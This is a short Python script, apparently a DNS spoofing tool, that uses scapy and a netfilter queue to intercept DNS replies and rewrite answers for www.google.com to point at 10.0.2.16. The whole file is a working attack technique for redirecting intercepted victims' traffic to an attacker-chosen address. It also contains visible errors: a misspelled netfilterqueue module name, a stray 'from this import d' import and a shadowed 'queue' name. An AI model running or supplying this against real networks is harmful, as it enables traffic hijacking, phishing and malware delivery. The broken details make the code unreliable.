#!/usr/bin/python  
import queue
from this import d
import netfliterqueue
import scapy.all as scapy

def spoof(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in qname:
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfliterqueue.NetfliterQueue()
queue.bind(0,spoof)
queue.run()